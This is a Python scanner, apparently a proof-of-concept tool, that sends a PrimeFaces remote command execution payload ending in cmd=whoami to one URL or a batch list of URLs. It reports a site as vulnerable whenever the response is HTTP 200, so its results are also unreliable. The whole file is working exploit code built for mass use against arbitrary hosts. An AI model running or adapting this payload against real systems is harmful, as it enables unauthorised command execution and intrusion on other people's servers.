import requests
import argparse

def banner():
    """Display the banner of the tool."""
    banner_text = """
                     \ \    / (_)              
  _ __ ___   __ ___  _\ \  / / _  _____      __
 | '_ ` _ \ / _` \ \/ /\ \/ / | |/ _ \ \ /\ / /
 | | | | | | (_| |>  <  \  /  | |  __/\ V  V / 
 |_| |_| |_|\__,_/_/\_\  \/   |_|\___| \_/\_/  """
    print(banner_text)
    print("Welcome to the vulnerability exploitation tool.")

def check_vulnerability(url):
    """Check if the specified URL has a remote command execution vulnerability."""
    try:
        # The POC to test for vulnerability
        poc = "pfdrt=sc&ln=primefaces&pfdrid=uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVqupdmBV%2FKAe9gtw54DSQCl72JjEAsHTRvxAuJC%2B%2FIFzB8dhqyGafOLqDOqc4QwUqLOJ5KuwGRarsPnIcJJwQQ7fEGzDwgaD0Njf%2FcNrT5NsETV8ToCfDLgkzjKVoz1ghGlbYnrjgqWarDvBnuv%2BEo5hxA5sgRQcWsFs1aN0zI9h8ecWvxGVmreIAuWduuetMakDq7ccNwStDSn2W6c%2BGvDYH7pKUiyBaGv9gshhhVGunrKvtJmJf04rVOy%2BZLezLj6vK%2BpVFyKR7s8xN5Ol1tz%2FG0VTJWYtaIwJ8rcWJLtVeLnXMlEcKBqd4yAtVfQNLA5AYtNBHneYyGZKAGivVYteZzG1IiJBtuZjHlE3kaH2N2XDLcOJKfyM%2FcwqYIl9PUvfC2Xh63Wh4yCFKJZGA2W0bnzXs8jdjMQoiKZnZiqRyDqkr5PwWqW16%2FI7eog15OBl4Kco%2FVjHHu8Mzg5DOvNevzs7hejq6rdj4T4AEDVrPMQS0HaIH%2BN7wC8zMZWsCJkXkY8GDcnOjhiwhQEL0l68qrO%2BEb%2F60MLarNPqOIBhF3RWB25h3q3vyESuWGkcTjJLlYOxHVJh3VhCou7OICpx3NcTTdwaRLlw7sMIUbF%2FciVuZGssKeVT%2FgR3nyoGuEg3WdOdM5tLfIthl1ruwVeQ7FoUcFU6RhZd0TO88HRsYXfaaRyC5HiSzRNn2DpnyzBIaZ8GDmz8AtbXt57uuUPRgyhdbZjIJx%2FqFUj%2BDikXHLvbUMrMlNAqSFJpqoy%2FQywVdBmlVdx%2BvJelZEK%2BBwNF9J4p%2F1fQ8wJZL2LB9SnqxAKr5kdCs0H%2FvouGHAXJZ%2BJzx5gcCw5h6%2Fp3ZkZMnMhkPMGWYIhFyWSSQwm6zmSZh1vRKfGRYd36aiRKgf3AynLVfTvxqPzqFh8BJUZ5Mh3V9R6D%2FukinKlX99zSUlQaueU22fj2jCgzvbpYwBUpD6a6tEoModbqMSIr0r7kYpE3tWAaF0ww4INtv2zUoQCRKo5BqCZFyaXrLnj7oA6RGm7ziH6xlFrOxtRd%2BLylDFB3dcYIgZtZoaSMAV3pyNoOzHy%2B1UtHe1nL97jJUCjUEbIOUPn70hyab29iHYAf3%2B9h0aurkyJVR28jIQlF4nT0nZqpixP%2Fnc0zrGppyu8dFzMqSqhRJgIkRrETErXPQ9sl%2BzoSf6CNta5ssizanfqqCmbwcvJkAlnPCP5OJhVes7lKCMlGH%2BOwPjT2xMuT6zaTMu3UMXeTd7U8yImpSbwTLhqcbaygXt8hhGSn5Qr7UQymKkAZGNKHGBbHeBIrEdjnVphcw9L2BjmaE%2BlsjMhGqFH6XWP5GD8FeHFtuY8bz08F4Wjt5wAeUZQOI4rSTpzgssoS1vbjJGzFukA07ahU%3D&cmd=whoami"
        full_url = f"{url}?{poc}"

        # Send a POST request
        response = requests.post(full_url, timeout=10)
        if response.status_code == 200:
            # Check the response content to determine if a vulnerability exists
            return f"{url} 存在远程命令执行漏洞."
        else:
            return f"{url} 不存在漏洞."

    except requests.RequestException as e:
        # Return only the error message
        return f"检测失败: {str(e)}"

def main():
    banner()
    parser = argparse.ArgumentParser(description='检测远程命令执行漏洞')
    parser.add_argument('-u', '--url', type=str, help='单个URL进行检测')
    parser.add_argument('-f', '--file', type=str, help='批量检测的URL文件')
    parser.add_argument('-o', '--output', type=str, help='输出结果保存到文件')

    args = parser.parse_args()

    results = []

    # Single URL detection
    if args.url:
        result = check_vulnerability(args.url)
        results.append(result)
        print(result)

    # Batch URL detection
    elif args.file:
        try:
            with open(args.file, 'r') as file:
                urls = file.readlines()
                for url in urls:
                    url = url.strip()  # Remove whitespace and newline characters
                    if url:
                        result = check_vulnerability(url)
                        results.append(result)
                        print(result)
        except FileNotFoundError:
            print(f"文件 {args.file} 未找到.")

    # Output results to a file
    if args.output:
        with open(args.output, 'w') as outfile:
            for result in results:
                outfile.write(result + '\n')
            print(f"结果已保存到 {args.output}.")


if __name__ == '__main__':
    main()
